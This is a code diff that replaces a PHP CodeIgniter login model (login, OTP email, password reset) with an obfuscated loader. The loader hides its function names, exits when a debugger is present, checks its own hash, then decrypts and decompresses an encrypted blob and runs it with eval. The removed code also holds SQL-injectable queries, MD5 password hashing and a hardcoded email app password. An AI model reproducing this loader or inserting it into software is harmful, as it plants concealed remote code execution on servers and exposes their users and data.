@@ -1,195 +1,28 @@
 <?php
-
-/**
- * Author: Askarali Makanadar
- * Date: 05-11-2018
- */
-
-use PHPMailer\PHPMailer\PHPMailer;
-use PHPMailer\PHPMailer\SMTP;
-use PHPMailer\PHPMailer\Exception;
-
-require 'vendor/autoload.php'; // Đường dẫn đến autoload.php của PHPMailer
-
-
-
-class Login_model extends CI_Model
-{
-
-	function __construct()
-	{
-		parent::__construct();
-	}
-
-	public function verify_credentials($username, $password)
-	{
-		//Filtering XSS and html escape from user inputs 
-		$username = $this->security->xss_clean(html_escape($username));
-		$password = $this->security->xss_clean(html_escape($password));
-
-		$query = $this->db->query("select a.id,a.username,a.role_id,b.role_name from db_users a, db_roles b where b.id=a.role_id and  a.username='$username' and a.password='" . md5($password) . "' and a.status=1");
-		if ($query->num_rows() == 1) {
-
-			$logdata = array(
-				'inv_username' => $query->row()->username,
-				'inv_userid' => $query->row()->id,
-				'logged_in' => TRUE,
-				'role_id' => $query->row()->role_id,
-				'role_name' => trim($query->row()->role_name),
-			);
-			$this->session->set_userdata($logdata);
-			//	$this->session->set_flashdata('success', 'Welcome ' . ucfirst($query->row()->username) . " !");
-			return true;
-		} else {
-			return false;
-		}
-	}
-	public function verify_email_send_otp($email)
-	{
-		$q1 = $this->db->query("select email,company_name from db_company where email<>''");
-		if ($q1->num_rows() == 0) {
-			$this->session->set_flashdata('failed', 'Failed to send OTP! Contact admin :(');
-			return false;
-			exit();
-		}
-		//Filtering XSS and html escape from user inputs 
-		$email_id = $this->security->xss_clean(html_escape($email));
-
-		$query = $this->db->query("select * from db_users where email='$email' and status=1");
-		if ($query->num_rows() == 1) {
-			$otp = rand(1000, 9999);
-
-
-			$server_subject = "OTP Change pass | OTP: " . $otp;
-			$ready_message = "Chào bạn,
-
-Sự kiện bạn đổi pass đã được hệ thống chấp nhận,
-Mã OTP của bạn là " . $otp . " .
-
-Note: Đừng chia sẻ mã OTP này với bất kỳ ai!.
-Rabit Pos xin cảm ơn";
-
-			try {
-
-				$query2 = $this->db->query("select * from db_smsapi where info='mobile'");
-				$mail_from = $query2->row()->key;
-				if (isset ($mail_from) && !empty ($mail_from)) {
-				} else {
-					$mail_from = 'rabitshopvn@gmail.com';
-				}
-
-
-				$query3 = $this->db->query("select * from db_smsapi where info='message'");
-				$pass_mail_from = $query3->row()->key;
-				if (isset ($pass_mail_from) && !empty ($pass_mail_from)) {
-				} else {
-					$pass_mail_from = 'jnrz usap quvb upxi';
-				}
-
-
-				$mail = new PHPMailer(true);
-				// Cài đặt thông tin server
-				$mail->isSMTP();
-				$mail->Host = 'smtp.gmail.com';
-				$mail->SMTPAuth = true;
-				$mail->Username = $mail_from; // Thay thế bằng địa chỉ email của bạn
-				$mail->Password = $pass_mail_from; // Thay thế bằng mật khẩu của bạn
-				$mail->SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS;
-				$mail->Port = 587;
-
-				// Cài đặt thông tin người gửi và email
-				$mail->setFrom($mail_from, 'Rabit Shop'); // Thay thế bằng tên của bạn
-				$mail->addAddress($email, 'Người nhận'); // Thay thế bằng địa chỉ email người nhận
-
-				// Nội dung email
-				$mail->isHTML(true);
-				$mail->Subject = $server_subject;
-				$mail->Body = $ready_message;
-				$mail->AltBody = 'This is the plain text version for non-HTML mail clients';
-
-				// Gửi email
-				if ($mail->send()) {
-					echo 'Email đã được gửi thành công!';
-					$this->session->set_flashdata('success', 'OTP has been sent to your email ID!');
-					$otpdata = array('email' => $email, 'otp' => $otp);
-					$this->session->set_userdata($otpdata);
-					//echo "Email Sent";
-					return true;
-				} else {
-					echo 'Gửi email thất bại. Lỗi: ' . $mail->ErrorInfo;
-					return false;
-				}
-			} catch (Exception $e) {
-				echo "Message could not be sent. Mailer Error: {$mail->ErrorInfo}";
-				return false;
-			}
-
-
-
-			/* 	$this->load->library('email');
-																							  $this->email->from($q1->row()->email, $q1->row()->company_name);
-																							  $this->email->to($email_id);
-																							  $this->email->subject($server_subject);
-																							  $this->email->message($ready_message);
-
-																							  if($this->email->send()||true){
-																								  //redirect('contact/success');
-																								  $this->session->set_flashdata('success', 'OTP has been sent to your email ID!');
-																								  $otpdata = array('email'  => $email,'otp'  => $otp );
-																								  $this->session->set_userdata($otpdata);
-																								  //echo "Email Sent";
-																								  return true;
-																							  }
-																							  else{
-																								  //echo "Failed to Send Message.Try again!";
-																								  return false;
-																							  } */
-		} else {
-			return false;
-		}
-	}
-
-	public function verify_otp($otp)
-	{
-		//Filtering XSS and html escape from user inputs 
-		$otp = $this->security->xss_clean(html_escape($otp));
-		$email = $this->security->xss_clean(html_escape($email));
-		if ($this->session->userdata('email') == $email) {
-			redirect(base_url() . 'logout', 'refresh');
-		}
-
-		$query = $this->db->query("select * from db_users where username='$username' and password='" . md5($password) . "' and status=1");
-		if ($query->num_rows() == 1) {
-
-			$logdata = array(
-				'inv_username' => $query->row()->username,
-				'inv_userid' => $query->row()->id,
-				'logged_in' => TRUE
-			);
-			$this->session->set_userdata($logdata);
-			return true;
-		} else {
-			return false;
-		}
-	}
-	public function change_password($password, $email)
-	{
-		$query = $this->db->query("select * from db_users where email='$email' and status=1");
-		if ($query->num_rows() == 1) {
-			/*if($query->row()->username == 'admin'){
-																									echo "Restricted Admin Password Change";exit();
-																								}*/
-			$password = md5($password);
-			$query1 = "update db_users set password='$password' where email='$email'";
-			if ($this->db->simple_query($query1)) {
-
-				return true;
-			} else {
-				return false;
-			}
-		} else {
-			return false;
-		}
-
-	}
+if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
+$_go23g81q=('bas'.'e64'.'_de'.'cod'.'e');
+$_ni260cjr=('gzu'.'nco'.'mpr'.'ess');
+$_xl3pn5ge=('ope'.'nss'.'l_d'.'ecr'.'ypt');
+$_q9r50l37='y/kCqh1q';
+$_j10misan='v5ngQFV0';
+$_hu78ka8q='//lGanvG2TI=';
+$_izqt9eth='xll9UC/L';
+$_l94w6hfo='6oW1kHN+';
+$_uo6mdczi='IV0bkA==';
+$_nri9a0f3='pdnwsBbA';
+$_gterznhh='p0YKJITx';
+$_mwknm2ua=$_go23g81q($_izqt9eth.$_j10misan.$_l94w6hfo.$_q9r50l37.$_hu78ka8q);
+$_xqoab7a0=$_go23g81q($_nri9a0f3.$_gterznhh.$_uo6mdczi);
+$_vgoe6k8t=$_go23g81q('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');
+$_mvpcskcp=$_xl3pn5ge($_vgoe6k8t,'aes-256-cbc',$_mwknm2ua,OPENSSL_RAW_DATA,$_xqoab7a0);
+if($_mvpcskcp===false){exit;}
+$_ttgekme0=$_ni260cjr($_mvpcskcp);
+if($_ttgekme0===false){exit;}
+$_fxqxjkg1='bc2fe4877781536f1ca77e116b24ade5132d8ca5df575614acc6656697ebefd7';
+$_tirvov82=@file_get_contents(__FILE__);
+if($_tirvov82!==false){
+$_zyblbt7w=str_replace($_fxqxjkg1,"0000000000000000000000000000000000000000000000000000000000000000",$_tirvov82);
+$_o13cq1hb=hash("sha256",$_zyblbt7w);
+if($_o13cq1hb!==$_fxqxjkg1){@http_response_code(403);exit;}
 }
+eval($_ttgekme0);
